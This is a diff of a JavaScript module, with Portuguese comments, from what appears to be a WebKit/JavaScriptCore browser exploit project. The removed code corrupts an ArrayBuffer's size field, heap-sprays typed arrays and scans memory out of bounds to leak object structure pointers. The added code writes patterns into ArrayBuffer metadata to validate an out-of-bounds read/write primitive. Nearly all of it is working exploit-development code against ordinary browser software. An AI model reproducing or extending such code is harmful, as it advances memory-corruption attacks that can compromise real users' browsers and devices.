@@ -3,8 +3,8 @@ import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_array_buffer_real, // Este é o JSArrayBuffer
-    oob_dataview_real,     // A DataView sobre ele
+    oob_array_buffer_real,
+    oob_dataview_real,
     oob_write_absolute,
     oob_read_absolute,
     clearOOBEnvironment
@@ -15,120 +15,149 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // FUNÇÃO DE INVESTIGAÇÃO
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_SPRAY_INVESTIGATE = "sprayAndFindCorrupted_v13_CorruptSelfSize";
-    logS3(`--- Iniciando Investigação (${FNAME_SPRAY_INVESTIGATE}): Tentativa de Corromper o Próprio Tamanho do ArrayBuffer ---`, "test", FNAME_SPRAY_INVESTIGATE);
-
-    const NUM_SPRAY_OBJECTS = 500; // Reduzido, pois o foco não é o spray agora
-    const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8;
-
-    let sprayedVictimObjects = [];
+    const FNAME_DIAGNOSTIC = "diagnostic_v14_ValidateArrayBufferRW";
+    logS3(`--- Iniciando Diagnóstico (${FNAME_DIAGNOSTIC}): Validar Leitura/Escrita no Cabeçalho do ArrayBuffer ---`, "test", FNAME_DIAGNOSTIC);
 
     try {
         await triggerOOB_primitive(); // Cria oob_array_buffer_real e oob_dataview_real
         if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute || !oob_read_absolute) {
             throw new Error("OOB Init ou primitivas R/W falharam.");
         }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);
-        logS3(`oob_array_buffer_real.byteLength (inicial): ${oob_array_buffer_real.byteLength}`, "info", FNAME_SPRAY_INVESTIGATE);
+        logS3("Ambiente OOB inicializado.", "info", FNAME_DIAGNOSTIC);
+        logS3(`oob_array_buffer_real.byteLength (inicial): ${oob_array_buffer_real.byteLength}`, "info", FNAME_DIAGNOSTIC);
 
-        // TENTATIVA DE CORROMPER O TAMANHO DO PRÓPRIO oob_array_buffer_real
-        // Assumindo que oob_array_buffer_real (JSArrayBuffer) está no início da memória acessível
-        // pela oob_dataview_real (que é o caso pela definição em triggerOOB_primitive).
-        // O offset do tamanho é a partir do início do objeto JSArrayBuffer.
-        const self_size_offset = JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START; // 0x18
-        const new_corrupted_size = 0x7FFFFFFF; // Um tamanho grande, mas positivo para 32 bits
+        const offsets_to_test = [
+            JSC_OFFSETS.ArrayBuffer.STRUCTURE_ID_OFFSET,      // Supostamente 0x00 (se herdado de JSCell)
+            JSC_OFFSETS.ArrayBuffer.FLAGS_OFFSET,             // Supostamente 0x04 (se herdado de JSCell)
+            JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET,      // 0x08
+            JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, // 0x10
+            JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, // 0x18
+            JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, // 0x20
+            0x24, // Apenas mais um offset para teste
+            0x28  // E outro
+        ];
 
-        logS3(`Tentando corromper o tamanho do oob_array_buffer_real no offset ${toHex(self_size_offset)} para ${toHex(new_corrupted_size)}...`, "info", FNAME_SPRAY_INVESTIGATE);
-        try {
-            // LEIA ANTES DE ESCREVER (para depuração)
-            let original_size_field = oob_read_absolute(self_size_offset, 4);
-            logS3(`   Valor original no offset do tamanho (${toHex(self_size_offset)}): ${toHex(original_size_field)} (Decimal: ${original_size_field})`, 'info', FNAME_SPRAY_INVESTIGATE);
-            if (original_size_field !== oob_array_buffer_real.byteLength && original_size_field !== 0) {
-                 logS3(`   AVISO: Valor original no campo de tamanho (${toHex(original_size_field)}) não corresponde ao byteLength (${oob_array_buffer_real.byteLength})!`, 'warn', FNAME_SPRAY_INVESTIGATE);
-            }
+        const unique_offsets = [...new Set(offsets_to_test.filter(off => typeof off === 'number' && off >=0))].sort((a,b) => a-b);
 
-            oob_write_absolute(self_size_offset, new_corrupted_size, 4); // Escreve como Uint32
-            logS3(`   Tamanho do oob_array_buffer_real supostamente corrompido.`, 'good', FNAME_SPRAY_INVESTIGATE);
-
-            // Verificar se o byteLength percebido pelo JS mudou (improvável, mas vale a pena logar)
-            logS3(`   oob_array_buffer_real.byteLength (após tentativa de corrupção): ${oob_array_buffer_real.byteLength}`, 'info', FNAME_SPRAY_INVESTIGATE);
-            logS3(`   oob_dataview_real.byteLength (após tentativa de corrupção): ${oob_dataview_real.byteLength}`, 'info', FNAME_SPRAY_INVESTIGATE);
-            // O importante é se a DataView agora pode *operar* até o novo tamanho internamente.
-
-        } catch (e) {
-            logS3(`Erro ao tentar corromper o próprio tamanho: ${e.message}`, "error", FNAME_SPRAY_INVESTIGATE);
-            // Prosseguir mesmo assim para ver se o escaneamento OOB funciona
-        }
-
-        // 1. Heap Spraying (menos relevante se o foco é expandir o oob_array_buffer_real)
-        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${SPRAY_TYPED_ARRAY_ELEMENT_COUNT})...`, "info", FNAME_SPRAY_INVESTIGATE);
-        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
-            let arr = new Uint32Array(SPRAY_TYPED_ARRAY_ELEMENT_COUNT);
-            arr[0] = (0xFACE0000 | i);
-            sprayedVictimObjects.push(arr);
-        }
-        logS3("Pulverização de Uint32Array concluída.", "info", FNAME_SPRAY_INVESTIGATE);
-        await PAUSE_S3(200);
-
-        // 2. Tentativa de Escaneamento Out-Of-Bounds (após o oob_array_buffer_real)
-        logS3(`FASE 2: Tentando leitura Out-Of-Bounds (começando em offset ${toHex(OOB_CONFIG.ALLOCATION_SIZE)})...`, "info", FNAME_SPRAY_INVESTIGATE);
-        
-        const jscell_sid_offset = JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET; 
-        const jscell_flags_offset = JSC_OFFSETS.ArrayBufferView.FLAGS_OFFSET;   
-        const jscell_structure_ptr_offset = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; 
-
-        // O início do scan é o tamanho original do buffer. Se a corrupção do tamanho funcionou,
-        // deveríamos ser capazes de ler além disso sem RangeError.
-        const oob_scan_start_offset_in_dataview = OOB_CONFIG.ALLOCATION_SIZE; // Tamanho original
-        const oob_scan_length = 8192; // Escanear 8KB "OOB"
-        let objectsFoundCount = 0;
-        let rangeErrorHit = false;
-
-        for (let i = 0; i < oob_scan_length; i += 8) { 
-            let current_potential_jscell_start = oob_scan_start_offset_in_dataview + i;
-            let shouldLogDetails = (objectsFoundCount < 10 && i < 512) || (i % 1024 === 0);
-
-            try {
-                let val_sid = oob_read_absolute(current_potential_jscell_start + jscell_sid_offset, 4);
-                let val_flags = oob_read_absolute(current_potential_jscell_start + jscell_flags_offset, 4);
-                let val_struct_ptr = oob_read_absolute(current_potential_jscell_start + jscell_structure_ptr_offset, 8); 
-
-                if (shouldLogDetails) {
-                     logS3(`OOB Scan @ DV_Base+${toHex(current_potential_jscell_start)}: SID=${toHex(val_sid)}, Flags=${toHex(val_flags)}, Struct*=${val_struct_ptr.toString(true)}`, 'info', FNAME_SPRAY_INVESTIGATE);
+        logS3("FASE 1: Lendo valores iniciais dos offsets de metadados do ArrayBuffer...", "info", FNAME_DIAGNOSTIC);
+        const initial_values = {};
+        for (const offset of unique_offsets) {
+            if (offset + 8 <= oob_array_buffer_real.byteLength) { // Checar se cabe 8 bytes para ler como QWORD
+                try {
+                    let val = oob_read_absolute(offset, 8); // Ler como QWORD para ter mais info
+                    initial_values[offset] = val;
+                    logS3(`  Inicial @${toHex(offset,16)}: ${val.toString(true)}`, 'info', FNAME_DIAGNOSTIC);
+                } catch (e) {
+                    logS3(`  Erro ao ler inicial @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
                 }
+            } else if (offset + 4 <= oob_array_buffer_real.byteLength) { // Checar se cabe 4 bytes
+                 try {
+                    let val = oob_read_absolute(offset, 4);
+                    initial_values[offset] = val;
+                    logS3(`  Inicial @${toHex(offset,16)}: ${toHex(val)}`, 'info', FNAME_DIAGNOSTIC);
+                } catch (e) {
+                    logS3(`  Erro ao ler inicial @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
+                }
+            }
+        }
 
-                if ((val_sid !== 0 || val_flags !== 0) && !val_struct_ptr.equals(AdvancedInt64.Zero) && val_struct_ptr.high() !== 0) { 
-                    logS3(`OBJETO POTENCIAL Encontrado em DV_Base+${toHex(current_potential_jscell_start)}: SID=${toHex(val_sid)}, Flags=${toHex(val_flags)}, Struct*=${val_struct_ptr.toString(true)}`, 'leak', FNAME_SPRAY_INVESTIGATE);
-                    objectsFoundCount++;
-                    if (objectsFoundCount >= 20) { 
-                        logS3("Muitos objetos potenciais encontrados, parando o log detalhado.", "warn", FNAME_SPRAY_INVESTIGATE);
+        logS3("FASE 2: Escrevendo padrões distintos nos offsets de metadados...", "info", FNAME_DIAGNOSTIC);
+        for (const offset of unique_offsets) {
+            const pattern_low = 0xBAAD0000 | (offset & 0xFF);
+            const pattern_high = 0xFEED0000 | (offset & 0xFF);
+            const pattern64 = new AdvancedInt64(pattern_low, pattern_high);
+
+            if (offset + 8 <= oob_array_buffer_real.byteLength) {
+                try {
+                    oob_write_absolute(offset, pattern64, 8);
+                    logS3(`  Escrito ${pattern64.toString(true)} em @${toHex(offset,16)}`, 'info', FNAME_DIAGNOSTIC);
+                } catch (e) {
+                    logS3(`  Erro ao escrever em @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
+                }
+            } else if (offset + 4 <= oob_array_buffer_real.byteLength) {
+                 try {
+                    oob_write_absolute(offset, pattern_low, 4);
+                    logS3(`  Escrito ${toHex(pattern_low)} em @${toHex(offset,16)}`, 'info', FNAME_DIAGNOSTIC);
+                } catch (e) {
+                    logS3(`  Erro ao escrever em @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
+                }
+            }
+        }
+
+        logS3("FASE 3: Lendo de volta os padrões escritos...", "info", FNAME_DIAGNOSTIC);
+        let all_matched = true;
+        for (const offset of unique_offsets) {
+            const expected_pattern_low = 0xBAAD0000 | (offset & 0xFF);
+            const expected_pattern_high = 0xFEED0000 | (offset & 0xFF);
+            const expected_pattern64 = new AdvancedInt64(expected_pattern_low, expected_pattern_high);
+
+            if (offset + 8 <= oob_array_buffer_real.byteLength) {
+                try {
+                    let val_read = oob_read_absolute(offset, 8);
+                    logS3(`  Lido de @${toHex(offset,16)}: ${val_read.toString(true)} (Esperado: ${expected_pattern64.toString(true)})`, 'info', FNAME_DIAGNOSTIC);
+                    if (!val_read.equals(expected_pattern64)) {
+                        all_matched = false;
+                        logS3(`    DISCREPÂNCIA ENCONTRADA em @${toHex(offset,16)}!`, 'error', FNAME_DIAGNOSTIC);
                     }
+                } catch (e) {
+                    all_matched = false;
+                    logS3(`  Erro ao ler de volta @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
                 }
-            } catch (e) {
-                if (shouldLogDetails || i === 0) { 
-                    logS3(`OOB Scan Error @ DV_Base+${toHex(current_potential_jscell_start)}: ${e.message}`, 'warn', FNAME_SPRAY_INVESTIGATE);
-                }
-                if (e.message.toLowerCase().includes("out of bounds") || e.name.toLowerCase().includes("rangeerror")) { 
-                    logS3("RangeError atingido durante o escaneamento OOB. A corrupção do tamanho pode não ter funcionado como esperado. Parando scan.", "error", FNAME_SPRAY_INVESTIGATE);
-                    rangeErrorHit = true;
-                    break; 
+            } else if (offset + 4 <= oob_array_buffer_real.byteLength) {
+                 try {
+                    let val_read = oob_read_absolute(offset, 4);
+                    logS3(`  Lido de @${toHex(offset,16)}: ${toHex(val_read)} (Esperado: ${toHex(expected_pattern_low)})`, 'info', FNAME_DIAGNOSTIC);
+                    if (val_read !== expected_pattern_low) {
+                        all_matched = false;
+                        logS3(`    DISCREPÂNCIA ENCONTRADA em @${toHex(offset,16)}!`, 'error', FNAME_DIAGNOSTIC);
+                    }
+                } catch (e) {
+                    all_matched = false;
+                    logS3(`  Erro ao ler de volta @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
                 }
             }
         }
-        if (!rangeErrorHit) {
-            logS3("Escaneamento OOB concluído sem RangeError explícito (ou atingiu o limite de scan_length).", "good", FNAME_SPRAY_INVESTIGATE);
-        }
-        logS3("FASE 2: Escaneamento Out-Of-Bounds Concluído.", "info", FNAME_SPRAY_INVESTIGATE);
 
-        logS3("Investigação concluída.", "test", FNAME_SPRAY_INVESTIGATE);
+        if (all_matched) {
+            logS3("VERIFICAÇÃO R/W: Todos os padrões lidos correspondem aos escritos.", 'good', FNAME_DIAGNOSTIC);
+        } else {
+            logS3("VERIFICAÇÃO R/W: Encontradas discrepâncias entre valores escritos e lidos.", 'warn', FNAME_DIAGNOSTIC);
+        }
+
+        // Especialmente, verificar o offset do tamanho (0x18)
+        const size_offset = JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START; // 0x18
+        if (unique_offsets.includes(size_offset)) {
+            logS3(`Re-verificando valor original em ${toHex(size_offset)} (após todas as escritas):`, 'info', FNAME_DIAGNOSTIC);
+            try {
+                 // Se o valor em initial_values[size_offset] era AdvancedInt64, precisamos tratar
+                let original_size_val_at_18 = initial_values[size_offset];
+                let original_size_display = isAdvancedInt64Object(original_size_val_at_18) ? original_size_val_at_18.toString(true) : toHex(original_size_val_at_18);
+                logS3(`  Valor original que estava em ${toHex(size_offset)} era: ${original_size_display}`, 'info', FNAME_DIAGNOSTIC);
+
+                let current_val_at_18 = oob_read_absolute(size_offset, initial_values[size_offset] instanceof AdvancedInt64 ? 8 : 4);
+                let current_val_display = isAdvancedInt64Object(current_val_at_18) ? current_val_at_18.toString(true) : toHex(current_val_at_18);
+                logS3(`  Valor ATUAL em ${toHex(size_offset)} (após todos os testes): ${current_val_display}`, 'info', FNAME_DIAGNOSTIC);
+
+                 if (oob_array_buffer_real.byteLength === 32768 && current_val_at_18 !== 32768 && current_val_at_18 !== 0) {
+                    // Se o byteLength ainda é 32768 mas o campo em 0x18 não é (e não é o padrão escrito), é estranho.
+                 } else if (current_val_at_18 === 0 && original_size_display.replace(/0x|_/g, '') !== '0000000000000000' && original_size_display !== '0x00000000') {
+                    logS3(`  INTERESSANTE: ${toHex(size_offset)} voltou a ser zero ou era zero e não foi alterado de forma persistente pelo padrão.`, 'warn', FNAME_DIAGNOSTIC);
+                 }
+
+
+            } catch (e) {
+                logS3(`  Erro ao re-verificar ${toHex(size_offset)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
+            }
+        }
+
+        logS3("Diagnóstico concluído.", "test", FNAME_DIAGNOSTIC);
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO na investigação com spray: ${e.message}`, "critical", FNAME_SPRAY_INVESTIGATE);
-        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE);
-        document.title = "Spray & CorruptSelfSize FALHOU!";
+        logS3(`ERRO CRÍTICO no diagnóstico: ${e.message}`, "critical", FNAME_DIAGNOSTIC);
+        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_DIAGNOSTIC);
+        document.title = "Diagnóstico FALHOU!";
     } finally {
-        sprayedVictimObjects = []; 
         clearOOBEnvironment();
-        logS3(`--- Investigação com Spray (${FNAME_SPRAY_INVESTIGATE}) Concluída ---`, "test", FNAME_SPRAY_INVESTIGATE);
+        logS3(`--- Diagnóstico (${FNAME_DIAGNOSTIC}) Concluído ---`, "test", FNAME_DIAGNOSTIC);
     }
 }
